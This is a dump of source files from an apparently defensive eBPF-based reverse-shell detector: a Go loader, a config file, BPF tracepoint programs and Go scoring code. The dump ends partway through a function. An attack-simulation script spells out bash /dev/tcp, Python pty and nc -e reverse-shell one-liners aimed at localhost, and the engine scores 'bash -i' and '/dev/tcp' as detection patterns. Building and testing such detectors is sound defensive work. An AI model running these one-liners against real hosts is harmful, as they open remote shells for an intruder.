+				HasDup2Stdio:   raw.HasDup2Stdio,
+				ForkParentPID:  raw.ForkParentPID,
+				SuspiciousMask: raw.SuspiciousMask,
+			}
+
+			comm := strings.ToLower(strings.TrimRight(string(event.Comm[:]), "\x00"))
+			if comm == "bash" || comm == "sh" || comm == "python3" || comm == "nc" {
+				l.logger.Info("DEBUG BPF EVENT",
+					zap.String("comm", comm),
+					zap.Uint32("pid", event.PID),
+					zap.Uint32("syscall_nr", event.SyscallNr),
+					zap.Uint8("has_execve", event.HasExecve),
+					zap.Uint8("has_socket", event.HasSocket),
+					zap.Uint8("has_connect", event.HasConnect),
+					zap.Uint8("has_dup2_stdio", event.HasDup2Stdio),
+					zap.Uint32("remote_ip4", event.RemoteIP4),
+					zap.Uint16("remote_port", event.RemotePort),
+				)
+			}
+
+			l.logger.Info("EVENT RECEIVED",
+				zap.Uint32("pid", event.PID),
+				zap.String("comm", strings.TrimRight(string(event.Comm[:]), "\x00")),
+			)
+
+			l.logger.Info("DEBUG SENDING TO CORRELATION",
+				zap.String("comm", comm),
+				zap.Uint32("pid", event.PID),
+			)
+
+			select {
+			case events <- event:
+				l.eventsRead.Add(1)
+			case <-ctx.Done():
+				errCh <- nil
+				return
+			}
+		}
+	}()
+
+	select {
+	case <-ctx.Done():
+		if err := l.Close(); err != nil {
+			return fmt.Errorf("ebpf loader: %w", err)
+		}
+		return nil
+	case err := <-errCh:
+		if closeErr := l.Close(); closeErr != nil && err == nil {
+			return fmt.Errorf("ebpf loader: %w", closeErr)
+		}
+		if err != nil {
+			return fmt.Errorf("ebpf loader: %w", err)
+		}
+		return nil
+	}
+}
+
+func toUnixTimestampNS(bootTime time.Time, ktimeNS uint64) uint64 {
+	if ktimeNS == 0 {
+		return 0
+	}
+	if bootTime.IsZero() {
+		bootTime = time.Now()
+	}
+	eventTime := bootTime.Add(time.Duration(ktimeNS))
+	return uint64(eventTime.UnixNano())
+}
+
+func getBootTime() time.Time {
+	data, err := os.ReadFile("/proc/stat")
+	if err == nil {
+		for _, line := range strings.Split(string(data), "\n") {
+			if strings.HasPrefix(line, "btime ") {
+				fields := strings.Fields(line)
+				if len(fields) >= 2 {
+					btime, parseErr := strconv.ParseInt(fields[1], 10, 64)
+					if parseErr == nil {
+						return time.Unix(btime, 0)
+					}
+				}
+			}
+		}
+	}
+	return time.Now()
+}
+
+func (l *Loader) Close() error {
+	if l == nil {
+		return nil
+	}
+
+	var closeErr error
+	l.closeOnce.Do(func() {
+		if l.reader != nil {
+			if err := l.reader.Close(); err != nil && !errors.Is(err, ringbuf.ErrClosed) {
+				closeErr = fmt.Errorf("ebpf loader: %w", err)
+			}
+		}
+
+		for _, lnk := range l.links {
+			if lnk == nil {
+				continue
+			}
+			if err := lnk.Close(); err != nil && closeErr == nil {
+				closeErr = fmt.Errorf("ebpf loader: %w", err)
+			}
+		}
+
+		if l.coll != nil {
+			l.coll.Close()
+		}
+	})
+
+	return closeErr
+}
+
+func (l *Loader) Stats() Stats {
+	if l == nil {
+		return Stats{}
+	}
+	return Stats{
+		EventsRead:     l.eventsRead.Load(),
+		LostEvents:     l.lostEvents.Load(),
+		AttachedProbes: len(l.links),
+	}
+}
+
+func attachTracepoints(coll *ebpf.Collection) ([]link.Link, error) {
+	bindings := []struct {
+		program string
+		group   string
+		name    string
+	}{
+		{program: "trace_enter_execve", group: "syscalls", name: "sys_enter_execve"},
+		{program: "trace_exit_execve", group: "syscalls", name: "sys_exit_execve"},
+		{program: "trace_enter_socket", group: "syscalls", name: "sys_enter_socket"},
+		{program: "trace_exit_socket", group: "syscalls", name: "sys_exit_socket"},
+		{program: "trace_enter_connect", group: "syscalls", name: "sys_enter_connect"},
+		{program: "trace_enter_dup2", group: "syscalls", name: "sys_enter_dup2"},
+		{program: "trace_enter_dup3", group: "syscalls", name: "sys_enter_dup3"},
+		{program: "trace_enter_fork", group: "syscalls", name: "sys_enter_fork"},
+		{program: "trace_enter_clone3", group: "syscalls", name: "sys_enter_clone3"},
+		{program: "trace_enter_pipe", group: "syscalls", name: "sys_enter_pipe"},
+		{program: "trace_enter_pipe2", group: "syscalls", name: "sys_enter_pipe2"},
+	}
+
+	links := make([]link.Link, 0, len(bindings))
+	for _, b := range bindings {
+		prog, ok := coll.Programs[b.program]
+		if !ok {
+			for _, lnk := range links {
+				_ = lnk.Close()
+			}
+			return nil, fmt.Errorf("missing program %s", b.program)
+		}
+
+		lnk, err := link.Tracepoint(b.group, b.name, prog, nil)
+		if err != nil {
+			for _, opened := range links {
+				_ = opened.Close()
+			}
+			return nil, err
+		}
+		links = append(links, lnk)
+	}
+
+	return links, nil
+}
+
+func ensureKernelVersion() error {
+	if runtime.GOOS != "linux" {
+		return nil
+	}
+
+	data, err := os.ReadFile("/proc/sys/kernel/osrelease")
+	if err != nil {
+		return err
+	}
+	release := strings.TrimSpace(string(data))
+	major, minor, err := parseKernelVersion(release)
+	if err != nil {
+		return err
+	}
+
+	if major < 5 || (major == 5 && minor < 8) {
+		return fmt.Errorf("kernel %s is unsupported, require >= 5.8", release)
+	}
+
+	return nil
+}
+
+func ensurePrivileges() error {
+	if runtime.GOOS != "linux" {
+		return nil
+	}
+
+	buf, err := os.ReadFile("/proc/self/status")
+	if err != nil {
+		return err
+	}
+	data := string(buf)
+
+	var capEffHex string
+	s := bufio.NewScanner(strings.NewReader(data))
+	for s.Scan() {
+		line := s.Text()
+		if strings.HasPrefix(line, "CapEff:") {
+			parts := strings.Fields(line)
+			if len(parts) >= 2 {
+				capEffHex = parts[1]
+			}
+			break
+		}
+	}
+	if capEffHex == "" {
+		return fmt.Errorf("failed to read CapEff from /proc/self/status")
+	}
+
+	val, err := strconv.ParseUint(capEffHex, 16, 64)
+	if err != nil {
+		return err
+	}
+
+	const capSysAdmin = 21
+	const capBPF = 39
+	hasSysAdmin := ((val >> capSysAdmin) & 1) == 1
+	hasBPF := ((val >> capBPF) & 1) == 1
+
+	if !hasSysAdmin && !hasBPF {
+		return fmt.Errorf("missing required capabilities: need CAP_SYS_ADMIN or CAP_BPF")
+	}
+
+	return nil
+}
+
+func parseKernelVersion(release string) (int, int, error) {
+	parts := strings.Split(release, ".")
+	if len(parts) < 2 {
+		return 0, 0, fmt.Errorf("invalid kernel release: %s", release)
+	}
+
+	major, err := strconv.Atoi(parts[0])
+	if err != nil {
+		return 0, 0, err
+	}
+
+	minorPart := parts[1]
+	if idx := strings.IndexAny(minorPart, "-+"); idx >= 0 {
+		minorPart = minorPart[:idx]
+	}
+	minor, err := strconv.Atoi(minorPart)
+	if err != nil {
+		return 0, 0, err
+	}
+
+	return major, minor, nil
+}
+===== CONFIG =====
+agent:
+  log_level: "info"
+  max_events_per_sec: 10000
+
+ebpf:
+  ring_buffer_size: 8388608
+
+correlation:
+  window_seconds: 5
+  cleanup_interval_seconds: 30
+
+detection:
+  score_threshold_critical: 0.90
+  score_threshold_high: 0.70
+  score_threshold_medium: 0.50
+  baseline_path: "/var/lib/rsbp/baseline.json"
+
+whitelist:
+  paths:
+    - "/usr/bin/node"
+    - "/usr/local/bin/node"
+    - "/usr/bin/curl"
+    - "/usr/bin/wget"
+    - "/usr/bin/docker"
+    - "/usr/bin/code"
+    - "/usr/lib/vscode*"
+    - "/snap/bin/*"
+  ips:
+    - "127.0.0.0/8"
+    - "10.0.0.0/8"
+    - "172.16.0.0/12"
+    - "192.168.0.0/16"
+    - "::1/128"
+  users: []
+  process_names:
+    - "node"
+    - "curl"
+    - "wget"
+    - "docker"
+    - "dockerd"
+    - "code"
+    - "cpuUsage.sh"
+    - "filebeat"
+    - "elasticsearch"
+    - "grafana"
+    - "rsbpd"
+    - "bpftool"
+    - "bpftrace"
+
+enrichment:
+  geoip_db_path: ""
+  abuseipdb_api_key: ""
+  timeout_seconds: 2
+
+forensics:
+  pcap_duration_seconds: 10
+  pcap_max_bytes: 1048576
+
+output:
+  jsonl:
+    enabled: true
+    path: "/var/log/rsbp/alerts.jsonl"
+  elasticsearch:
+    enabled: false
+  splunk:
+    enabled: false
+  kafka:
+    enabled: false
+  syslog:
+    enabled: false
+  webhook:
+    enabled: false
+
+api:
+  listen_addr: "127.0.0.1:9001"
+  enabled: true
+===== ATTACK SIM =====
+#!/bin/bash
+# WARNING: Run only in isolated VM/container. This script triggers REAL reverse shell behaviors.
+# It does NOT establish actual C2 connection - uses 127.0.0.1 on blocked port.
+
+echo "[*] Scenario 1: bash /dev/tcp (will fail to connect - detection test only)"
+timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' 2>/dev/null || true
+sleep 1
+
+echo "[*] Scenario 2: python socket"
+timeout 2 python3 -c "import socket,os,pty;s=socket.socket();s.connect(('127.0.0.1',9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')" 2>/dev/null || true
+sleep 1
+
+echo "[*] Scenario 3: nc"
+timeout 2 nc 127.0.0.1 9997 -e /bin/sh 2>/dev/null || true
+
+echo "[+] Simulation complete. Check /var/log/rsbp/alerts.jsonl for detections."
+===== BPF (first 400 lines) =====
+#include "headers/vmlinux.h"
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+#include <bpf/bpf_core_read.h>
+#include <bpf/bpf_endian.h>
+#include "headers/rsbp.h"
+
+#ifndef AF_INET
+#define AF_INET 2
+#endif
+
+#ifndef AF_INET6
+#define AF_INET6 10
+#endif
+
+#ifndef __NR_execve
+#define __NR_execve 59
+#endif
+
+#ifndef __NR_socket
+#define __NR_socket 41
+#endif
+
+#ifndef __NR_connect
+#define __NR_connect 42
+#endif
+
+#ifndef __NR_dup2
+#define __NR_dup2 33
+#endif
+
+#ifndef __NR_dup3
+#define __NR_dup3 292
+#endif
+
+#ifndef __NR_fork
+#define __NR_fork 57
+#endif
+
+#ifndef __NR_clone3
+#define __NR_clone3 435
+#endif
+
+#ifndef __NR_pipe
+#define __NR_pipe 22
+#endif
+
+#ifndef __NR_pipe2
+#define __NR_pipe2 293
+#endif
+
+struct pid_fd_key {
+    __u32 pid;
+    __s32 fd;
+};
+
+struct socket_info {
+    __u16 family;
+    __u16 port;
+    __u32 ip4;
+    __u8 ip6[16];
+};
+
+struct socket_enter_state {
+    __u16 family;
+    __u16 pad;
+};
+
+struct {
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, 8 * 1024 * 1024);
+} events SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 65536);
+    __type(key, __u32);
+    __type(value, struct socket_enter_state);
+} socket_enter_map SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 131072);
+    __type(key, struct pid_fd_key);
+    __type(value, struct socket_info);
+} socket_fd_map SEC(".maps");
+
+static __always_inline __u64 read_enter_arg(struct trace_event_raw_sys_enter *ctx, __u32 idx)
+{
+    __u64 arg = 0;
+
+    if (idx >= 6)
+        return 0;
+
+    bpf_probe_read_kernel(&arg, sizeof(arg), &ctx->args[idx]);
+    return arg;
+}
+
+static __always_inline void fill_common(struct syscall_event *evt, __u32 syscall_nr, __s32 fd)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u64 uid_gid = bpf_get_current_uid_gid();
+    struct task_struct *task = (struct task_struct *)bpf_get_current_task_btf();
+
+    evt->pid = (__u32)(pid_tgid >> 32);
+    evt->uid = (__u32)(uid_gid & 0xffffffffULL);
+    evt->gid = (__u32)(uid_gid >> 32);
+    evt->ppid = BPF_CORE_READ(task, real_parent, tgid);
+    evt->syscall_nr = syscall_nr;
+    evt->fd = fd;
+    evt->timestamp_ns = bpf_ktime_get_ns();
+    bpf_get_current_comm(evt->comm, sizeof(evt->comm));
+}
+
+static __always_inline void submit_basic(__u32 syscall_nr, __s32 fd)
+{
+    struct syscall_event *evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+
+    if (!evt)
+        return;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, syscall_nr, fd);
+    bpf_ringbuf_submit(evt, 0);
+}
+
+SEC("tracepoint/syscalls/sys_enter_execve")
+int trace_enter_execve(struct trace_event_raw_sys_enter *ctx)
+{
+    struct syscall_event *evt;
+    const char *filename = (const char *)read_enter_arg(ctx, 0);
+    const char *const *argv = (const char *const *)read_enter_arg(ctx, 1);
+    const char *arg0 = 0;
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_execve, -1);
+    evt->has_execve = 1;
+
+    if (filename)
+        bpf_probe_read_user_str(evt->exec_path, sizeof(evt->exec_path), filename);
+
+    if (argv) {
+        bpf_probe_read_user(&arg0, sizeof(arg0), &argv[0]);
+        if (arg0)
+            bpf_probe_read_user_str(evt->args, sizeof(evt->args), arg0);
+    }
+
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_exit_execve")
+int trace_exit_execve(struct trace_event_raw_sys_exit *ctx)
+{
+    submit_basic(__NR_execve, -1);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_socket")
+int trace_enter_socket(struct trace_event_raw_sys_enter *ctx)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = (__u32)(pid_tgid >> 32);
+    struct socket_enter_state st = {};
+    struct syscall_event *evt;
+
+    st.family = (__u16)read_enter_arg(ctx, 0);
+    bpf_map_update_elem(&socket_enter_map, &pid, &st, BPF_ANY);
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_socket, -1);
+    evt->has_socket = 1;
+    evt->family = st.family;
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_exit_socket")
+int trace_exit_socket(struct trace_event_raw_sys_exit *ctx)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = (__u32)(pid_tgid >> 32);
+    struct socket_enter_state *st;
+    struct pid_fd_key key = {};
+    struct socket_info si = {};
+    long ret_fd = -1;
+
+    bpf_probe_read_kernel(&ret_fd, sizeof(ret_fd), &ctx->ret);
+    if (ret_fd < 0)
+        return 0;
+
+    st = bpf_map_lookup_elem(&socket_enter_map, &pid);
+    if (st)
+        si.family = st->family;
+
+    key.pid = pid;
+    key.fd = (__s32)ret_fd;
+    bpf_map_update_elem(&socket_fd_map, &key, &si, BPF_ANY);
+    bpf_map_delete_elem(&socket_enter_map, &pid);
+
+    {
+        struct syscall_event *evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+        if (!evt)
+            return 0;
+
+        __builtin_memset(evt, 0, sizeof(*evt));
+        fill_common(evt, __NR_socket, (__s32)ret_fd);
+        evt->has_socket = 1;
+        evt->family = si.family;
+        bpf_ringbuf_submit(evt, 0);
+    }
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_connect")
+int trace_enter_connect(struct trace_event_raw_sys_enter *ctx)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = (__u32)(pid_tgid >> 32);
+    __s32 fd = (__s32)read_enter_arg(ctx, 0);
+    struct sockaddr *addr = (struct sockaddr *)read_enter_arg(ctx, 1);
+    struct pid_fd_key key = {};
+    struct socket_info si = {};
+    struct syscall_event *evt;
+
+    key.pid = pid;
+    key.fd = fd;
+
+    if (addr) {
+        __u16 family = 0;
+        bpf_probe_read_user(&family, sizeof(family), &addr->sa_family);
+        si.family = family;
+
+        if (family == AF_INET) {
+            struct sockaddr_in sa4 = {};
+            bpf_probe_read_user(&sa4, sizeof(sa4), addr);
+            si.port = bpf_ntohs(sa4.sin_port);
+            si.ip4 = sa4.sin_addr.s_addr;
+        } else if (family == AF_INET6) {
+            struct sockaddr_in6 sa6 = {};
+            bpf_probe_read_user(&sa6, sizeof(sa6), addr);
+            si.port = bpf_ntohs(sa6.sin6_port);
+            __builtin_memcpy(si.ip6, sa6.sin6_addr.in6_u.u6_addr8, sizeof(si.ip6));
+        }
+
+        bpf_map_update_elem(&socket_fd_map, &key, &si, BPF_ANY);
+    }
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_connect, fd);
+    evt->has_connect = 1;
+    evt->family = si.family;
+    evt->remote_port = si.port;
+    evt->remote_ip4 = si.ip4;
+    __builtin_memcpy(evt->remote_ip6, si.ip6, sizeof(evt->remote_ip6));
+    bpf_ringbuf_submit(evt, 0);
+
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_dup2")
+int trace_enter_dup2(struct trace_event_raw_sys_enter *ctx)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = (__u32)(pid_tgid >> 32);
+    __s32 oldfd = (__s32)read_enter_arg(ctx, 0);
+    __s32 newfd = (__s32)read_enter_arg(ctx, 1);
+    struct pid_fd_key key = {.pid = pid, .fd = oldfd};
+    struct socket_info *si;
+    struct syscall_event *evt;
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_dup2, oldfd);
+
+    if (newfd == 0 || newfd == 1 || newfd == 2) {
+        si = bpf_map_lookup_elem(&socket_fd_map, &key);
+        if (si) {
+            evt->has_dup2_stdio = 1;
+            evt->family = si->family;
+            evt->remote_port = si->port;
+            evt->remote_ip4 = si->ip4;
+            __builtin_memcpy(evt->remote_ip6, si->ip6, sizeof(evt->remote_ip6));
+        }
+    }
+
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_dup3")
+int trace_enter_dup3(struct trace_event_raw_sys_enter *ctx)
+{
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = (__u32)(pid_tgid >> 32);
+    __s32 oldfd = (__s32)read_enter_arg(ctx, 0);
+    __s32 newfd = (__s32)read_enter_arg(ctx, 1);
+    struct pid_fd_key key = {.pid = pid, .fd = oldfd};
+    struct socket_info *si;
+    struct syscall_event *evt;
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_dup3, oldfd);
+
+    if (newfd == 0 || newfd == 1 || newfd == 2) {
+        si = bpf_map_lookup_elem(&socket_fd_map, &key);
+        if (si) {
+            evt->has_dup2_stdio = 1;
+            evt->family = si->family;
+            evt->remote_port = si->port;
+            evt->remote_ip4 = si->ip4;
+            __builtin_memcpy(evt->remote_ip6, si->ip6, sizeof(evt->remote_ip6));
+        }
+    }
+
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_fork")
+int trace_enter_fork(struct trace_event_raw_sys_enter *ctx)
+{
+    struct syscall_event *evt;
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_fork, -1);
+    evt->fork_parent_pid = evt->pid;
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_clone3")
+int trace_enter_clone3(struct trace_event_raw_sys_enter *ctx)
+{
+    struct syscall_event *evt;
+
+    evt = bpf_ringbuf_reserve(&events, sizeof(*evt), 0);
+    if (!evt)
+        return 0;
+
+    __builtin_memset(evt, 0, sizeof(*evt));
+    fill_common(evt, __NR_clone3, -1);
+    evt->fork_parent_pid = evt->pid;
+    bpf_ringbuf_submit(evt, 0);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_pipe")
+int trace_enter_pipe(struct trace_event_raw_sys_enter *ctx)
+{
+    submit_basic(__NR_pipe, -1);
+    return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_pipe2")
+int trace_enter_pipe2(struct trace_event_raw_sys_enter *ctx)
+{
+    submit_basic(__NR_pipe2, -1);
+    return 0;
+}
+
+char LICENSE[] SEC("license") = "GPL";
+
+===== STEP 3: ALL DETECTION GO FILES =====
+===== ./internal/detection/baseline.go =====
+package detection
+
+import (
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"sync"
+	"time"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+)
+
+type BaselineModel struct {
+	mu          sync.Mutex
+	UpdatedAt   time.Time         `json:"updated_at"`
+	TotalEvents uint64            `json:"total_events"`
+	TotalAlerts uint64            `json:"total_alerts"`
+	PatternHits map[string]uint64 `json:"pattern_hits"`
+	AvgScore    float64           `json:"avg_score"`
+}
+
+func NewBaselineModel() *BaselineModel {
+	return &BaselineModel{PatternHits: map[string]uint64{}}
+}
+
+func LoadBaseline(path string) (*BaselineModel, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var m BaselineModel
+	if err := json.Unmarshal(data, &m); err != nil {
+		return nil, err
+	}
+	if m.PatternHits == nil {
+		m.PatternHits = map[string]uint64{}
+	}
+	return &m, nil
+}
+
+func (b *BaselineModel) Observe(state *correlation.SessionState, score float64, alerted bool) {
+	if b == nil {
+		return
+	}
+	b.mu.Lock()
+	defer b.mu.Unlock()
+
+	b.TotalEvents++
+	if alerted {
+		b.TotalAlerts++
+	}
+	if b.TotalEvents == 1 {
+		b.AvgScore = score
+	} else {
+		b.AvgScore = ((b.AvgScore * float64(b.TotalEvents-1)) + score) / float64(b.TotalEvents)
+	}
+	if p := correlation.BestMatchPattern(state); p != nil {
+		b.PatternHits[p.Name]++
+	}
+	b.UpdatedAt = time.Now().UTC()
+}
+
+func (b *BaselineModel) Save(path string) error {
+	if b == nil || path == "" {
+		return nil
+	}
+	b.mu.Lock()
+	payload, err := json.MarshalIndent(b, "", "  ")
+	b.mu.Unlock()
+	if err != nil {
+		return err
+	}
+
+	dir := filepath.Dir(path)
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	tmp := path + ".tmp"
+	if err := os.WriteFile(tmp, payload, 0o644); err != nil {
+		return err
+	}
+	return os.Rename(tmp, path)
+}
+
+===== ./internal/detection/engine.go =====
+package detection
+
+import (
+	"crypto/sha1"
+	"encoding/hex"
+	"fmt"
+	"net"
+	"path"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysFork    = 57
+	sysClone   = 56
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+type Config struct {
+	ExecConnectWindowSeconds int     `mapstructure:"exec_connect_window_seconds"`
+	MinScore                 float64 `mapstructure:"min_score"`
+	EnableBaseline           bool    `mapstructure:"enable_baseline"`
+	BaselineFile             string  `mapstructure:"baseline_file"`
+	Whitelist                WhitelistConfig
+}
+
+type WhitelistConfig struct {
+	Paths        []string
+	IPs          []string
+	Users        []uint32
+	ProcessNames []string
+}
+
+type Engine struct {
+	cfg            Config
+	logger         *zap.Logger
+	pathSet        map[string]struct{}
+	processNameSet map[string]struct{}
+	userSet        map[uint32]struct{}
+	ipNets         []*net.IPNet
+	ipSet          map[string]struct{}
+	baseline       *BaselineModel
+	rules          []Rule
+}
+
+func NewEngine(cfg Config, logger *zap.Logger) *Engine {
+	if cfg.ExecConnectWindowSeconds <= 0 {
+		cfg.ExecConnectWindowSeconds = 20
+	}
+	if cfg.MinScore <= 0 {
+		cfg.MinScore = 0.75
+	}
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+
+	e := &Engine{
+		cfg:            cfg,
+		logger:         logger,
+		pathSet:        make(map[string]struct{}),
+		processNameSet: make(map[string]struct{}),
+		userSet:        make(map[uint32]struct{}),
+		ipNets:         make([]*net.IPNet, 0),
+		ipSet:          make(map[string]struct{}),
+		baseline:       NewBaselineModel(),
+		rules:          DefaultRules(),
+	}
+	e.buildWhitelistCaches()
+	if cfg.EnableBaseline {
+		if cfg.BaselineFile == "" {
+			cfg.BaselineFile = "/var/lib/rsbp/baseline.json"
+		}
+		loaded, err := LoadBaseline(cfg.BaselineFile)
+		if err == nil && loaded != nil {
+			e.baseline = loaded
+		} else {
+			logger.Debug("baseline load skipped", zap.Error(err))
+		}
+	}
+	return e
+}
+
+func (e *Engine) Evaluate(state *correlation.SessionState, ev types.SyscallEvent, hostID string) []*types.ReverseShellAlert {
+	if state == nil {
+		return nil
+	}
+
+	baseScore := e.behaviorScore(state)
+	ruleEval := EvaluateRulesWithRules(RuleInput{
+		Session:    state,
+		Enrichment: nil,
+		EventTime:  time.Unix(0, int64(ev.TimestampNS)).UTC(),
+	}, e.rules)
+	if ruleEval.Score > baseScore {
+		baseScore = ruleEval.Score
+	}
+	e.logger.Debug("detection evaluating session",
+		zap.Uint32("pid", state.PID),
+		zap.Float64("score", baseScore),
+	)
+
+	if e.isWhitelisted(state) {
+		e.logger.Debug("session suppressed by whitelist",
+			zap.Uint32("pid", state.PID),
+			zap.String("exe", state.ExePath),
+			zap.String("remote_ip", state.RemoteIP.String()),
+		)
+		return nil
+	}
+
+	if baseScore < e.cfg.MinScore {
+		e.baseline.Observe(state, baseScore, false)
+		return nil
+	}
+
+	alert := &types.ReverseShellAlert{
+		AlertID:       buildAlertID(fmt.Sprintf("pid-%d", state.PID), ev.TimestampNS, ev.SyscallNr),
+		Timestamp:     time.Unix(0, int64(ev.TimestampNS)).UTC(),
+		HostID:        hostID,
+		SessionID:     fmt.Sprintf("pid-%d", state.PID),
+		EventChain:    correlatedChain(state),
+		MITREAttack:   MITREForRules(ruleEval.FiredRules),
+		Severity:      scoreToSeverity(baseScore),
+		Confidence:    baseScore,
+		RuleID:        primaryRuleID(ruleEval.FiredRules),
+		Description:   "Correlated syscall chain matched reverse shell behavior",
+		CorrelationID: buildCorrelationID(fmt.Sprintf("%d:%d:%d", state.PID, state.PPID, state.StartTime.UnixNano())),
+		Metadata: map[string]string{
+			"detector":    "heuristic-chain-v1",
+			"window_sec":  fmt.Sprintf("%d", e.cfg.ExecConnectWindowSeconds),
+			"category":    fmt.Sprintf("%d", state.Category),
+			"fired_rules": strings.Join(ruleEval.FiredRules, ","),
+		},
+		Process: types.ProcessContext{
+			PID:     state.PID,
+			PPID:    state.PPID,
+			UID:     state.UID,
+			GID:     state.GID,
+			Comm:    processComm(state),
+			Exe:     state.ExePath,
+			Cmdline: state.Cmdline,
+		},
+		Network: types.NetworkContext{
+			RemoteIP:   state.RemoteIP.String(),
+			RemotePort: state.RemotePort,
+			Protocol:   "tcp",
+		},
+	}
+
+	e.logger.Debug("alert generated",
+		zap.String("session_id", alert.SessionID),
+		zap.Float64("confidence", alert.Confidence),
+		zap.String("severity", string(alert.Severity)),
+	)
+
+	e.baseline.Observe(state, baseScore, true)
+
+	return []*types.ReverseShellAlert{alert}
+}
+
+func (e *Engine) SaveBaseline() error {
+	if e == nil || !e.cfg.EnableBaseline || e.baseline == nil {
+		return nil
+	}
+	if e.cfg.BaselineFile == "" {
+		return nil
+	}
+	return e.baseline.Save(e.cfg.BaselineFile)
+}
+
+func (e *Engine) behaviorScore(state *correlation.SessionState) float64 {
+	if !state.HasExecve || !state.HasConnect {
+		return 0
+	}
+	if state.LastUpdate.Sub(state.StartTime) > time.Duration(e.cfg.ExecConnectWindowSeconds)*time.Second {
+		return 0
+	}
+
+	score := 0.55
+	if state.HasSocket {
+		score += 0.10
+	}
+	if state.HasDupToStdio {
+		score += 0.20
+	}
+	if state.HasForkWithPipe {
+		score += 0.10
+	}
+	if state.Category == 2 || state.Category == 3 {
+		score += 0.05
+	}
+
+	if strings.Contains(strings.ToLower(state.Cmdline), "bash -i") || strings.Contains(strings.ToLower(state.Cmdline), "/dev/tcp") {
+		score += 0.10
+	}
+
+	if p := correlation.BestMatchPattern(state); p != nil {
+		score += p.Confidence * 0.05
+	}
+
+	if score > 1 {
+		score = 1
+	}
+	return score
+}
+
+func (e *Engine) buildWhitelistCaches() {
+	for _, p := range defaultProcessWhitelist {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+
+	for _, p := range e.cfg.Whitelist.Paths {
+		cleaned := strings.TrimSpace(strings.ToLower(path.Clean(p)))
+		if cleaned != "" {
+			e.pathSet[cleaned] = struct{}{}
+		}
+	}
+	for _, p := range e.cfg.Whitelist.ProcessNames {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+	for _, u := range e.cfg.Whitelist.Users {
+		e.userSet[u] = struct{}{}
+	}
+	for _, raw := range e.cfg.Whitelist.IPs {
+		candidate := strings.TrimSpace(raw)
+		if candidate == "" {
+			continue
+		}
+		if strings.Contains(candidate, "/") {
+			_, ipNet, err := net.ParseCIDR(candidate)
+			if err == nil {
+				e.ipNets = append(e.ipNets, ipNet)
+			}
+			continue
+		}
+		if ip := net.ParseIP(candidate); ip != nil {
+			e.ipSet[ip.String()] = struct{}{}
+		}
+	}
+}
+
+func (e *Engine) isWhitelisted(state *correlation.SessionState) bool {
+	if state == nil {
+		return false
+	}
+	if shouldSuppressNode443Telemetry(state) {
+		return true
+	}
+	if len(e.pathSet) == 0 && len(e.processNameSet) == 0 && len(e.userSet) == 0 && len(e.ipSet) == 0 && len(e.ipNets) == 0 {
